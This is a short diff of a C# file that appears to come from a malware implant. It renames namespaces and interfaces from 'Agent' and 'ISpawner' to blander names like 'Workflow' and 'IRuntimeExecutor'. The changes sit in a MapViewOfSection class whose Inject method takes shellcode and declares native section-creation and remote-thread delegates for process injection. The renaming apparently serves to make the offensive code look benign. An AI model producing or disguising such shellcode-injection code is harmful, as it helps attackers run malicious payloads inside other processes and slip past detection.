@@ -1,13 +1,13 @@
-﻿using Agent;
+using Workflow;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using Invoker.Dynamic;
 using System;
-using Agent.Interfaces;
-using Agent.Models;
+using Workflow.Contracts;
+using Workflow.Models;
 using Microsoft.Win32.SafeHandles;
 
-namespace Agent
+namespace Workflow
 {
     internal class MapViewOfSection : ITechnique
     {
@@ -16,7 +16,7 @@ namespace Agent
         private delegate uint ncsDelegate(ref IntPtr SectionHandle, Native.SectionAccess DesiredAccess, IntPtr ObjectAttributes, ref ulong MaximumSize, Native.MemoryProtection SectionPageProtection, Native.MappingAttributes AllocationAttributes, IntPtr FileHandle);
         private delegate IntPtr rcutDelegate(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, int stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, Native.CLIENT_ID clientId);
 
-        async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
+        async Task<bool> ITechnique.Inject(IRuntimeExecutor spawner, SpawnOptions spawnOptions, byte[] shellcode)
         {
             if (!await spawner.Spawn(spawnOptions))
             {
